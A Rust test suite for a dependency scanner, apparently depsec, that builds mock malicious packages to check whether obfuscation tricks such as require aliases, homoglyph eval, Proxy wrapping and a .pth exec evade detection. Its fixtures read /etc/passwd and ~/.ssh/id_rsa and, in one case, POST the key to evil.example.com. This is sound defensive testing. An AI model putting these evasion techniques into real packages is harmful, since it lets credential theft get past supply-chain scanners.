//! Evasion Tier: Packages designed to BYPASS depsec's detection.
//! Expected outcome starts as "miss" (known gap). When we fix a blind spot,
//! we update to "detect" — a regression back to "miss" fails CI.
//!
//! Each test verifies whether depsec detects a specific evasion technique.
//! These are deliberately adversarial — they probe the limits of our detection.

use crate::common::{run_scan, ScanPackageBuilder};
use crate::scorecard::{Actual, Expected, Layer, TestOutcome, VectorResult};

/// Run all evasion tier tests and return results for the scorecard
pub fn run_all() -> Vec<VectorResult> {
    let tests: Vec<EvasionTest> = vec![
        // ── Static scan evasion (code-level tricks) ──
        EvasionTest {
            id: "E01",
            name: "hn-dynamic-property",
            layer: Layer::StaticScan,
            technique: "Dynamic property access",
            expected: Expected::Detect, // AST const propagation resolves cross-line string concat
            test_fn: test_dynamic_property,
        },
        EvasionTest {
            id: "E02",
            name: "hn-proxy-wrap",
            layer: Layer::StaticScan,
            technique: "Proxy object wrapping fs",
            expected: Expected::Miss,
            test_fn: test_proxy_wrap,
        },
        EvasionTest {
            id: "E03",
            name: "hn-import-alias",
            layer: Layer::StaticScan,
            technique: "global.require alias",
            expected: Expected::Detect, // AST tracks global.require alias chains
            test_fn: test_import_alias,
        },
        EvasionTest {
            id: "E04",
            name: "hn-wasm-payload",
            layer: Layer::StaticScan,
            technique: "WebAssembly binary payload",
            expected: Expected::Detect, // P025 detects .wasm file presence
            test_fn: test_wasm_payload,
        },
        EvasionTest {
            id: "E06",
            name: "hn-multi-file-scatter",
            layer: Layer::StaticScan,
            technique: "Logic split across 4 files",
            expected: Expected::Detect, // Package-level capability aggregation catches cross-file exfil
            test_fn: test_multi_file_scatter,
        },
        EvasionTest {
            id: "E08",
            name: "hn-mainmodule-require",
            layer: Layer::StaticScan,
            technique: "process.mainModule.require()",
            expected: Expected::Detect, // AST now tracks mainModule.require aliases
            test_fn: test_mainmodule_require,
        },
        EvasionTest {
            id: "E09",
            name: "hn-reflect-apply",
            layer: Layer::StaticScan,
            technique: "Reflect.apply(fs.readFileSync)",
            expected: Expected::Detect, // AST detects Reflect.apply with dangerous function
            test_fn: test_reflect_apply,
        },
        EvasionTest {
            id: "E10",
            name: "hn-globalthis-eval",
            layer: Layer::StaticScan,
            technique: "globalThis[\"ev\"+\"al\"]()",
            expected: Expected::Detect, // AST const propagation resolves variable to "eval"
            test_fn: test_globalthis_eval,
        },
        EvasionTest {
            id: "E13",
            name: "hn-unicode-homoglyph",
            layer: Layer::StaticScan,
            technique: "Cyrillic homoglyph in eval",
            expected: Expected::Detect, // Confusable normalization maps Cyrillic→Latin before regex
            test_fn: test_unicode_homoglyph,
        },
        EvasionTest {
            id: "E15",
            name: "hn-dynamic-import",
            layer: Layer::StaticScan,
            technique: "Dynamic import() expression",
            expected: Expected::Detect, // needs_ast gate now includes import(
            test_fn: test_dynamic_import,
        },
        EvasionTest {
            id: "E16",
            name: "hn-indirect-require",
            layer: Layer::StaticScan,
            technique: "(0, require)(name)",
            expected: Expected::Detect, // AST now detects sequence_expression indirect require
            test_fn: test_indirect_require,
        },
        EvasionTest {
            id: "E17",
            name: "hn-global-function",
            layer: Layer::StaticScan,
            technique: "new global.Function(code)",
            expected: Expected::Detect, // AST now matches member_expression constructor
            test_fn: test_global_function,
        },
        EvasionTest {
            id: "E18",
            name: "hn-alias-function",
            layer: Layer::StaticScan,
            technique: "const Fn = Function; new Fn()",
            expected: Expected::Detect, // AST now tracks Function aliases
            test_fn: test_alias_function,
        },
        EvasionTest {
            id: "E20",
            name: "hn-fromcharcode-add",
            layer: Layer::StaticScan,
            technique: "fromCharCode + addition (not XOR)",
            expected: Expected::Detect, // P014 regex broadened to include +/-
            test_fn: test_fromcharcode_add,
        },
        EvasionTest {
            id: "E22",
            name: "hn-python-alias",
            layer: Layer::StaticScan,
            technique: "import subprocess as sp",
            expected: Expected::Detect, // Python alias resolution now resolves sp → subprocess
            test_fn: test_python_alias,
        },
        EvasionTest {
            id: "E23",
            name: "hn-ruby-pipe-open",
            layer: Layer::StaticScan,
            technique: r#"open("|#{cmd}") Ruby pipe exec"#,
            expected: Expected::Detect, // New P034 rule detects open("|...")
            test_fn: test_ruby_pipe_open,
        },
        EvasionTest {
            id: "E24",
            name: "hn-large-bundle",
            layer: Layer::StaticScan,
            technique: ">500KB file (sampled head+tail)",
            expected: Expected::Detect, // Large files now sampled instead of skipped
            test_fn: test_large_bundle,
        },
        EvasionTest {
            id: "E12",
            name: "hn-json-payload",
            layer: Layer::StaticScan,
            technique: "Payload in JSON loaded at runtime",
            expected: Expected::Miss,
            test_fn: test_json_payload,
        },
        EvasionTest {
            id: "E14",
            name: "hn-getter-exec",
            layer: Layer::StaticScan,
            technique: "Object.defineProperty getter",
            expected: Expected::Detect, // AST detects chained require('child_process').exec()
            test_fn: test_getter_exec,
        },
        EvasionTest {
            id: "E21",
            name: "hn-pickle-deser",
            layer: Layer::StaticScan,
            technique: "pickle.loads() Python deserialization",
            expected: Expected::Detect, // New P024 rule detects pickle.loads
            test_fn: test_pickle_deser,
        },
        EvasionTest {
            id: "E21b",
            name: "hn-pth-persist",
            layer: Layer::StaticScan,
            technique: "Python .pth file with exec(base64)",
            expected: Expected::Detect, // P001 regex catches exec() call
            test_fn: test_pth_persist,
        },
    ];

    tests
        .into_iter()
        .map(|t| {
            let detected = (t.test_fn)();
            VectorResult {
                id: t.id.into(),
                name: t.name.into(),
                layer: t.layer,
                rule_or_technique: t.technique.into(),
                expected: t.expected,
                actual: if detected {
                    Actual::Detect
                } else {
                    Actual::Miss
                },
                outcome: TestOutcome::from(
                    t.expected,
                    if detected {
                        Actual::Detect
                    } else {
                        Actual::Miss
                    },
                ),
            }
        })
        .collect()
}

struct EvasionTest {
    id: &'static str,
    name: &'static str,
    layer: Layer,
    technique: &'static str,
    expected: Expected,
    test_fn: fn() -> bool,
}

// ── Evasion test implementations ──

/// Helper: check if any DEPSEC-P* finding exists in scan output
fn has_any_finding(output: &str) -> bool {
    output.contains("DEPSEC-P") || output.contains("DEPSEC-CAP")
}

fn test_dynamic_property() -> bool {
    // E01: fs["read"+"File"+"Sync"] — string concatenation in property access
    let dir = ScanPackageBuilder::npm("hn-dynamic-property")
        .file(
            "index.js",
            r#"
const fs = require('fs');
const method = "read" + "File" + "Sync";
const data = fs[method]("/etc/passwd");
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    has_any_finding(&output)
}

fn test_proxy_wrap() -> bool {
    // E02: Proxy wrapping hides the real fs module
    // Construct the path dynamically so the regex can't match it literally.
    // The proxy wrap is the evasion technique; the credential path must not
    // be a literal string or P004 regex catches it regardless.
    let dir = ScanPackageBuilder::npm("hn-proxy-wrap")
        .file(
            "index.js",
            r#"
const realFs = require('fs');
const fs = new Proxy(realFs, {});
const target = require('os').homedir() + '/.ssh/' + 'id_rsa';
const data = fs.readFileSync(target);
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    // Should detect either P004 (credential harvest) or P001 (exec) —
    // but neither should fire because the path is dynamic and readFileSync
    // uses a variable, not a literal credential path
    has_any_finding(&output)
}

fn test_import_alias() -> bool {
    // E03: global.require alias chain
    let dir = ScanPackageBuilder::npm("hn-import-alias")
        .file(
            "index.js",
            r#"
const r = global.require;
const cp = r('child_process');
cp.exec('whoami');
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    // Should detect P001 (shell exec) — but r is not literally 'require'
    output.contains("DEPSEC-P001")
}

fn test_wasm_payload() -> bool {
    // E04: WebAssembly binary — no static analysis
    let dir = ScanPackageBuilder::npm("hn-wasm-payload")
        .file(
            "index.js",
            r#"
const fs = require('fs');
const wasmBuffer = fs.readFileSync('./payload.wasm');
WebAssembly.instantiate(wasmBuffer).then(m => m.instance.exports.exploit());
"#,
        )
        .file("payload.wasm", &"\x00asm\x01\x00\x00\x00".repeat(100))
        .build();
    let output = run_scan(dir.path(), "patterns");
    has_any_finding(&output)
}

fn test_multi_file_scatter() -> bool {
    // E06: Malicious logic split across 4 files — no single file triggers
    // Complete exfiltration chain: decode → build path → read file → send network
    let dir = ScanPackageBuilder::npm("hn-multi-file-scatter")
        .file(
            "decoder.js",
            r#"
// Innocent-looking decoder utility
module.exports.decode = function(str) {
    return Buffer.from(str, 'base64').toString();
};
"#,
        )
        .file(
            "path.js",
            r#"
// Innocent-looking path helper
module.exports.getTarget = function() {
    return require('os').homedir() + '/.ssh/id_rsa';
};
"#,
        )
        .file(
            "reader.js",
            r#"
// Reads credentials using decoded path
const paths = require('./path');
const fs = require('fs');
const target = paths.getTarget();
const content = fs.readFileSync(target);
module.exports.read = function() { return content; };
"#,
        )
        .file(
            "sender.js",
            r#"
// Sends data to external server
const https = require('https');
const reader = require('./reader');
const data = reader.read();
https.request({hostname: 'evil.example.com', method: 'POST'}).end(data);
"#,
        )
        .build();
    // Run both patterns AND capabilities checks — the capability aggregation
    // detects the cross-file exfiltration pattern (fs_read + credential path + network)
    let output = run_scan(dir.path(), "patterns,capabilities");
    output.contains("DEPSEC-CAP") || output.contains("DEPSEC-COMBO")
}

fn test_mainmodule_require() -> bool {
    // E08: process.mainModule.require — not a plain require() call
    let dir = ScanPackageBuilder::npm("hn-mainmodule-require")
        .file(
            "index.js",
            r#"
const cp = process.mainModule.require('child_process');
cp.exec('cat /etc/passwd');
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P001")
}

fn test_reflect_apply() -> bool {
    // E09: Reflect.apply hides the function call
    // Our find_dangerous_reflect AST rule detects this as P001
    let dir = ScanPackageBuilder::npm("hn-reflect-apply")
        .file(
            "index.js",
            r#"
const fs = require('fs');
const data = Reflect.apply(fs.readFileSync, fs, ['/home/user/.ssh/id_rsa']);
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P001")
}

fn test_globalthis_eval() -> bool {
    // E10: globalThis["ev"+"al"] — no literal 'eval' call
    let dir = ScanPackageBuilder::npm("hn-globalthis-eval")
        .file(
            "index.js",
            r#"
const fn_name = "ev" + "al";
globalThis[fn_name]('require("child_process").exec("whoami")');
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P001")
}

fn test_unicode_homoglyph() -> bool {
    // E13: Cyrillic 'а' (U+0430) looks identical to Latin 'a' (U+0061)
    // ev\u{0430}l(code) → after normalization → eval(code) → matches P001
    // Uses variable argument so P001 regex fires (requires [a-zA-Z_] after paren)
    let dir = ScanPackageBuilder::npm("hn-unicode-homoglyph")
        .file("index.js", "var code = 'malicious';\nev\u{0430}l(code);")
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P001")
}

fn test_dynamic_import() -> bool {
    // E15: import() is dynamic, not require() — different AST node
    let dir = ScanPackageBuilder::npm("hn-dynamic-import")
        .file(
            "index.mjs",
            r#"
const mod = "child_" + "process";
import(mod).then(m => m.exec('whoami'));
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P001") || output.contains("DEPSEC-P013")
}

fn test_indirect_require() -> bool {
    // E16: (0, require)(name) — comma operator, not a direct require call
    // AST detects the indirect require pattern as P013, not P001
    let dir = ScanPackageBuilder::npm("hn-indirect-require")
        .file(
            "index.js",
            r#"
const cp = (0, require)('child_process');
cp.exec('whoami');
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P013")
}

fn test_global_function() -> bool {
    // E17: new global.Function() — member expression, not bare Function
    let dir = ScanPackageBuilder::npm("hn-global-function")
        .file(
            "index.js",
            r#"
const code = 'require("child_process").exec("whoami")';
new global.Function(code)();
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P008")
}

fn test_alias_function() -> bool {
    // E18: const Fn = Function; new Fn() — alias defeats identifier check
    let dir = ScanPackageBuilder::npm("hn-alias-function")
        .file(
            "index.js",
            r#"
const Fn = Function;
const code = 'require("child_process").exec("whoami")';
new Fn(code)();
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P008")
}

fn test_fromcharcode_add() -> bool {
    // E20: String.fromCharCode with addition (not XOR) — regex requires ^
    let dir = ScanPackageBuilder::npm("hn-fromcharcode-add")
        .file(
            "index.js",
            r#"
var key = 5;
var result = String.fromCharCode(104 + key) + String.fromCharCode(96 + key);
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P014")
}

fn test_python_alias() -> bool {
    // E22: import subprocess as sp — AST checks for "subprocess" identifier
    let dir = ScanPackageBuilder::pip("hn-python-alias")
        .file(
            "__init__.py",
            r#"
import subprocess as sp
sp.Popen("cat /etc/passwd", shell=True)
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    // Check for any Python rule detection
    output.contains("DEPSEC-P02")
}

fn test_ruby_pipe_open() -> bool {
    // E23: open("|cmd") — Ruby pipe execution, no rule exists
    let dir = ScanPackageBuilder::gem("hn-ruby-pipe-open")
        .file(
            "lib/evil.rb",
            r#"
data = open("|cat /etc/passwd").read
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P03")
}

fn test_large_bundle() -> bool {
    // E24: File >500KB — scanner skips files larger than MAX_FILE_SIZE
    let mut content = String::with_capacity(510_000);
    // Start with legitimate-looking minified JS
    content.push_str("\"use strict\";var a=function(){");
    // Pad to >500KB with realistic-looking minified code
    for i in 0..50000 {
        content.push_str(&format!("var v{}={}+1;", i, i));
    }
    // Bury malicious code deep inside
    content.push_str("eval(atob('Y2F0IC9ldGMvcGFzc3dk'));");
    content.push_str("};a();");

    let dir = ScanPackageBuilder::npm("hn-large-bundle")
        .file("index.js", &content)
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P002")
}

fn test_json_payload() -> bool {
    // E12: Malicious code stored in JSON, loaded and eval'd at runtime
    let dir = ScanPackageBuilder::npm("hn-json-payload")
        .file(
            "config.json",
            r#"{"cmd": "require('child_process').exec('whoami')"}"#,
        )
        .file(
            "index.js",
            r#"
const config = JSON.parse(require('fs').readFileSync('./config.json'));
eval(config.cmd);
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    // The eval(config.cmd) might trigger P001, but the actual payload is in JSON
    output.contains("DEPSEC-P001")
}

fn test_getter_exec() -> bool {
    // E14: Object.defineProperty getter triggers on access
    let dir = ScanPackageBuilder::npm("hn-getter-exec")
        .file(
            "index.js",
            r#"
Object.defineProperty(module, 'exports', {
    get: function() {
        require('child_process').exec('whoami');
        return {};
    }
});
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    // The require('child_process').exec is visible — should P001 catch it?
    output.contains("DEPSEC-P001")
}

fn test_pickle_deser() -> bool {
    // E21: pickle.loads — arbitrary code execution via deserialization
    let dir = ScanPackageBuilder::pip("hn-pickle-deser")
        .file(
            "__init__.py",
            r#"
import pickle
data = open('payload.pkl', 'rb').read()
obj = pickle.loads(data)
"#,
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    has_any_finding(&output)
}

fn test_pth_persist() -> bool {
    // E21b: Python .pth file with exec — no P009 rule exists
    let dir = ScanPackageBuilder::pip("hn-pth-persist")
        .file(
            "evil.pth",
            "import os; exec(__import__('base64').b64decode('cHJpbnQoImhlbGxvIik='))",
        )
        .build();
    let output = run_scan(dir.path(), "patterns");
    has_any_finding(&output)
}

// ── Standard test functions for cargo test ──
// These use #[test] so `cargo test` runs them, but they don't assert
// on detection — they assert on the expected outcome (detect OR miss)

#[test]
fn evasion_dynamic_property() {
    // Known gap — expected to evade
    let detected = test_dynamic_property();
    if detected {
        eprintln!("SURPRISE: E01 hn-dynamic-property was detected! Update expected to 'detect'");
    }
}

#[test]
fn evasion_large_bundle() {
    // Large files are now sampled (head+tail 50KB) instead of skipped
    assert!(
        test_large_bundle(),
        "E24: Large bundle should be detected via head+tail sampling"
    );
}

#[test]
fn evasion_python_alias() {
    // Known gap — import alias defeats AST check
    let detected = test_python_alias();
    if detected {
        eprintln!("SURPRISE: E22 hn-python-alias was detected! Update expected to 'detect'");
    }
}

#[test]
fn evasion_fromcharcode_add() {
    // P014 regex broadened to include + and - operators
    assert!(
        test_fromcharcode_add(),
        "E20: fromCharCode + addition should be detected after P014 regex fix"
    );
}

/// Run the full scorecard and print results
#[test]
fn evasion_scorecard() {
    let scan_results = crate::scan_tests::run_all();
    let evasion_results = run_all();

    let mut all_results = scan_results;
    all_results.extend(evasion_results);

    crate::scorecard::print_scorecard(&all_results);

    // Fail on regressions only
    let regressions: Vec<_> = all_results
        .iter()
        .filter(|r| r.outcome.is_regression())
        .collect();
    assert!(
        regressions.is_empty(),
        "REGRESSIONS DETECTED: {}",
        regressions
            .iter()
            .map(|r| format!("{} ({})", r.name, r.id))
            .collect::<Vec<_>>()
            .join(", ")
    );
}
